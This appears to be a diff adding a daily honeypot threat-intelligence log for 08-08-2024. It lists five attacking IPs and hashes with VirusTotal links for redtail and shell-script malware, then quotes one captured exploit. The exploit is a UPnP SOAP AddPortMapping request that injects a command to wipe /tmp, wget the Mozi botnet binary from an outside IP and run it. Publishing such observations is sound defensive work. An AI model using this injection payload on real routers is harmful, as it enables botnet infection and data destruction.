@@ -1,0 +1,52 @@
+Top 5 IPs for 08-08-2024 :
+
+91.231.202.215
+125.209.85.187
+49.43.251.182
+134.209.222.136
+111.180.193.233
+
+
+
+Malware Observed:
+
+File Name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File Name : redtail.arm8
+66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+https://www.virustotal.com/gui/file/66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+
+
+File Name : redtail.i686
+929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+https://www.virustotal.com/gui/file/929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+
+
+File Name : redtail.x86_64
+17229e1940e272030b079915600ea9fd944b8250680d89e1ee1eca42bbe3772f
+https://www.virustotal.com/gui/file/17229e1940e272030b079915600ea9fd944b8250680d89e1ee1eca42bbe3772f
+
+
+File Name : setup.sh
+3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae
+https://www.virustotal.com/gui/file/3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae
+
+Commands/exploits observed:
+
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <Host IP>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://220.158.159.52:58551/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
+
+
+
